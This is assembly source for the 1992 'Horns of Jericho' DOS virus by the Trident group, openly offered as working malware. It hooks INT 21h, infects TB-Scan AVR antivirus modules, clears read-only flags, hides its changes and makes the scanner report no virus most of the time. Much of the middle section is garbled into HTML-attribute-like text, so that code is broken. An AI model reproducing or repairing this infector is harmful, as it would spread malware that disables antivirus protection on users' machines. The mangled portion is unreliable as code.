

;*** HORNS OF JERICHO/AVR-VIR VIRUS SOURCE CODE ***
; (c) 1992 Crom-Cruach / TRIDENT Virus Research Group
;
; Actual virus size: 624 bytes
;
;- Research only, of course.
;- Don't be lame by changing the name, please
;
;  This virus is a high memory resident infector of AVR files.
;  It disables scanning by the AVR 3 out of 4 times (random)
;
;  Date/time are saved & it overrides the R/O flag.
;
;  MAKERES is the code called by TB-Scan
;  NEW21 is the I21 handler
;
;  Written in A86 assembly
;
;  Greetz 2 - NuKE, Phalcon/SKISM, YAM & Demoralized Youth
;  Gruntz (might be destructive) 2 all lamers, see above
;
;  I included a FAKE Avr module which doesn't detect Coffeeshop-3,
;  not to spread worldwide, ofcourse, but to show how it infects.

Start:          jmp long EndMem         ; Jump is replaced by '[Ho'

                db 'rns Of Jericho (c) 92 Crom-Cruach/Trident]'


;*** Executed by scanner, installs I21 handler ***

MakeRes:        cld
                xor di,di
                mov ds,di
                mov dx,[086]                    ; Get seg I21
                mov bp,[046C]                   ; Get random nr.
                mov ax,044A0                    ; Already installed?
                int 021
                cmp ah,0FF                      ; Yep, leave
                je Restore

                mov ah,062                      ; Get curr. PSP ofs
                int 021
                xchg bx,ax                      ; MOV AX,BX (but 1 byte)

                cmp ax,si                       ; Prog-MCB-Seg < i21="" seg?="" jb="" restore="" ;="" yes;="" quit="" dec="" ax="" loopmcb:="" mov="" ds,ax="" cmp="" byte="" ptr="" [di],'z'="" ;="" [0]="" (but="" it's="" shorter)="" je="" got_endmcb="" add="" ax,[di+3]="" ;="" [3]="" (^^)="" inc="" ax="" jmp="" short="" loopmcb="" got_endmcb:="" mov="" bx,[di+3]="" ;="" [3]="" cmp="" bx,virpars+01000="" ;="" place="" for="" vir="" +="" 64k="" spare?="" jb="" restore="" sub="" bx,virpars="" ;="" yep="" mov="" [di+3],bx="" ;="" [3];="" decrease="" memory="" add="" ax,bx="" sub="" ax,(offset="" startpar-1)="" ;="" -="" startpar="" +="" 1="" (mcb_par)="" mov="" es,ax="" ;="" es="seg" high-mem="" for="" vir="" push="" cs="" pop="" ds="" mov="" cx,virsize="" herevirofs:="" mov="" si,offset="" start="" mov="" di,offset="" start="" repz="" movsb="" ;="" move="" vir="" naar="" high="" mem="" mov="" ds,cx="" ;="" cx="" is="" zero="" mov="" ax,[084]="" mov="" word="" ptr="" es:[i21adr],ax="" mov="" word="" ptr="" es:[i21adr+2],dx="" ;="" already="" asked="" at="" begin="" cli="" mov="" word="" ptr="" [084],offset="" new21="" mov="" [086],es="" sti="" restore:="" test="" bp,3="" jz="" goavr="" ;="" exec.="" avr="" only="" 1="" out="" of="" 4="" times="" clc="" retf="" 0a="" ;="" tell="" scanner="" -="" no="" virus="" found.="" goavr:="" mov="" si,048="" ;="" entry="" point="" of="" avr="" push="" cs="" pop="" ds="" sub="" word="" ptr="" [03c],wholepars="" mov="" di,[03c]="" ;="" size="" of="" real="" avr="" pop="" [di+offset="" returnavraddr-offset="" start]="" ;save="" addr.="" scanner="" pop="" [di+offset="" returnavraddr-offset="" start+2]="" push="" cs="" ;="" new="" avr-return="" address="" add="" di,offset="" afteravr-offset="" start="" push="" di="" mov="" word="" ptr="" [si],020cdh="" ;="" restore="" orig.="" avr="" bytes="" min2org:="" mov="" byte="" ptr="" [si+2],090="" ;="" (now:="" return="" to="" dos="" i20)="" min1org:="" jmp="" si="" ;***="" misc.="" procedures="" ***="" readfile:="" push="" ax="" ;="" read="" part="" of="" avr="" file="" mov="" ah,03f="" mov="" dx,offset="" rdbuf="" int="" 021="" ;="" bx="" must="" be="" handle="" cmp="" ax,cx="" ;="" return="" carry="" if=""><asked pop="" ax="" ret="" saveregs:="" mov="" cs:saveds,ds="" push="" cs="" pop="" ds="" mov="" saveax,ax="" mov="" savecx,cx="" mov="" savedx,dx="" mov="" savesi,si="" mov="" savedi,di="" ret="" getregs:="" push="" cs="" pop="" ds="" mov="" ax,saveax="" mov="" cx,savecx="" mov="" dx,savedx="" mov="" si,savesi="" mov="" di,savedi="" mov="" ds,saveds="" ret="" makesum:="" push="" bx="" ;="" save="" handle="" sumloop:="" xchg="" bx,ax="" ;mov="" bx,ax;="" but="" in="" 1="" byte="" shl="" bx,1="" lodsb="" add="" ax,bx="" mov="" ah,bh="" test="" ah,080="" jz="" noxor="" xor="" ax,0a097="" noxor:="" loop="" sumloop="" pop="" bx="" ret="" gobegfile:="" push="" cx="" push="" dx="" mov="" ax,04200="" ;="" go="" to="" beg.="" of="" file="" xor="" cx,cx="" cwd="" ;="" mov="" dx,0="" 1="" byte=""></asked><8000) int="" 021="" ;="" bx="" must="" be="" file="" handle="" pop="" dx="" pop="" cx="" ret="" ;***="" saved="" data="" -="" the="" filehandle="" (ffff="no" file)="" fhandle="" dw="" 0ffff="" ;******="" new="" i21="" handler="" ******="" new21:="" ;---="" if="" ax="44A0:" ah-="">FF; is sign: Vir already installed ---

                cmp ax,044A0
                jne NoF
                cbw             ; Al is signed; AH -> FF
                iret

;--- On 3D-Open, check if file is AVR, & if so, save handle ---

NoF:            cmp ah,3Dh              ; Read?
                jne Close
                test al,3
                jnz Go21                ; He wanted to write as well!
                cmp cs:FHandle,0FFFF
                jne Go21                ; Already a file traced
                push ds
                call SaveRegs
                pop ds
                cld
                mov si,dx
                cmp word ptr [si],':C'          ; file on c-drive?
                jne JDos                      ; No; quit
SrchEnd:        lodsb                           ; end of filename
                cmp al,0
                jne SrchEnd
                cmp word ptr [si-5],'A.'        ; .A?
                jne JDos
                cmp word ptr [si-3],'RV'        ; VR?
                jne JDos

;*** Clear R/O flag ***
                mov ax,04300                    ; Get file attr.
                int 021
                jc JDos
                mov cs:Attr,cx
                test cl,1
                jz IsOk                         ; No R/O flag set
                mov ax,04301
                and cl,0FE                      ; Clear flag
                int 021
                jc JDos
IsOk:
                call GetRegs
                or al,2                         ; Read & write!
                int 021                         ; Try opening file
                pushf
                push ax
                push cx
                mov ax,04301
                mov cx,cs:Attr
                int 021
                pop cx
                pop ax
                popf
                jnc Save_Handle                   ; Err, Quit&Try open w/o write
JDos:           jmp short Go2Dos
Save_Handle:    mov cs:FHandle,ax
                retf 2


;--- On 3E-Close, infect AVR if not already infected ---

Close:          cmp ah,03E                      ; Close?
                jne Go21                        ; No, quit
                cmp bx,cs:FHandle               ; Is traced AVR module?
                je SameFile                     ; No, quit
Go21:           jmp i21Jmp
SameFile:       mov word ptr cs:FHandle,0FFFF   ; Clear FHandle
                call SaveRegs
                call GoBegFile
                mov cx,050
                call ReadFile
                jb Go2Dos                    ; Can't be <50h bytes.="" ;test="" if="" file="" is="" a="" good="" avr="" file="" mov="" si,dx="" ;="" ofs.="" rdbuf="" cmp="" byte="" ptr="" [si+048],0e9="" ;="" infected?="" je="" go2dos="" ;="" yeah,="" quit="" cmp="" byte="" ptr="" [si+041],0="" ;="" check="" first="" 0="" ne_ret:="" jne="" go2dos="" cmp="" word="" ptr="" [si+042],1="" ;="" check="" 1="" 0="" jne="" go2dos="" ;write="" jump="" to="" end-of-avr="" mov="" ax,word="" ptr="" [si+048]="" ;="" save="" org.="" bytes="" mov="" [min2org-2],ax="" mov="" al,byte="" ptr="" [si+04a]="" mov="" [min1org-1],al="" mov="" ax,word="" ptr="" [si+03c]="" ;="" length="" of="" avr="" test="" al,0f="" ;="" not="" 6?="" jz="" no_ret="" go2dos:="" jmp="" short="" quit2dos="" no_ret:="" add="" word="" ptr="" [si+03c],wholepars="" ;="" add="" size="" of="" virus="" mov="" [herevirofs+1],ax="" ;="" write="" ofs="" of="" virus="" (for="" move)="" mov="" di,ax="" sub="" di,cx="" ;="" di="bytes" still="" to="" read="" mov="" byte="" ptr="" [si+048],0e9="" add="" ax,offset="" makeres-offset="" start-048-3="" ;="" set="" jmp="" 2="" vir="" mov="" [si+049],ax="" ;="" jump="" on="" start="" mov="" [offset="" returnavr-2],ax="" ;="" restore-jump="" call="" gobegfile="" mov="" ah,040="" ;="" write="" header,="" with="" jmp="" added="" int="" 021="" ;="" cx="" still="" 50h,="" dx="" still="" rdbuf="" xor="" ax,ax="" ;="" chksum="" 0="" ;***="" csum="" calculate.="" here="" of="" file="" -="" result="" in="" ax="" ***="" loopcode:="" call="" makesum="" mov="" si,dx="" mov="" cx,di="" jcxz="" doneread="" readmore:="" cmp="" cx,0100="" ;="" buffer="100h" bytes="" jna="" nomore="" mov="" cx,0100="" nomore:="" sub="" di,cx="" call="" readfile="" jmp="" short="" loopcode="" ;***="" and="" of="" virus="" itself="" ***="" doneread:="" mov="" si,offset="" start="" mov="" cx,offset="" wholepars-2="" mov="" dx,si="" call="" makesum="" mov="" word="" ptr="" [si],ax="" ;="" save="" sum="" mov="" ah,040="" mov="" cx,offset="" wholepars="" int="" 021="" ;***="" and="" preserve="" file="" date/time="" mov="" ax,05700="" int="" 021="" mov="" ax,05701="" int="" 021="" quit2dos:="" call="" getregs="" ;="" go="" interrupt,="" restore="" regs="" i21jmp:="" db="" 0ea="" ;="" jmp="" far="" i21adr="" dw="" 0,0="" ;***="" after="" the="" execution="" of="" the="" org.="" avr,="" it="" jumps="" to="" here="" ***="" afteravr:="" add="" word="" ptr="" cs:[03c],wholepars="" ;="" restore="" to="" avr+virsize="" mov="" byte="" ptr="" cs:[048],0e9="" ;="" jmp="" long="" mov="" word="" ptr="" cs:[049],01234="" ;="" filled="" next="" infection="" returnavr:="" db="" 0ea="" ;="" jump="" back="" to="" scanner="" endvir:="" ;***="" end="" of="" written="" virus="" ***="" returnavraddr="" dw="" 0,0="" rdbuf="" db="" 0100="" dup="" (?)="" ;***="" ...="" data="" only="" in="" memory="" ***="" saveax="" dw="" 0="" savecx="" dw="" 0="" savedx="" dw="" 0="" savesi="" dw="" 0="" savedi="" dw="" 0="" saveds="" dw="" 0="" readsize="" dw="" 0="" attr="" dw="" 0="" endmem:="" ;="" ***="" end="" of="" memory="" data="" ***="" ;***="" this="" code="" is="" only="" executed="" for="" installing="" the="" 'mother'="" into="" memory.="" ;="" it="" is="" not="" a="" real="" part="" of="" the="" virus="" code.="" mov="" byte="" ptr="" [start],'['="" mov="" word="" ptr="" [start+1],'oh'="" mov="" ax,0ffff="" int="" 021="" cmp="" ah,0fe="" je="" noinit="" mov="" ax,03521="" int="" 021="" mov="" [i21jmp+1],bx="" mov="" [i21jmp+3],es="" mov="" ax,02521="" mov="" dx,offset="" new21="" int="" 021="" mov="" ax,03100="" mov="" dx,virpars+010="" ;="" also="" psp="" required="" int="" 021="" noinit:="" ret="" virsize="" equ="" (offset="" endvir-offset="" start)="" virpars="" equ="" (offset="" endmem-offset="" start+0f)="" shr="" 4="" ;="" pars="" of="" memory="" required="" startpar="" equ="" offset="" start="" shr="" 4="" wholepars="" equ="" ((offset="" endvir-offset="" start+2+0f)="" shr="" 4)="" shl="" 4="" ;="" whole="" pars,="" 2="" bytes="" csum=""></50h></8000)>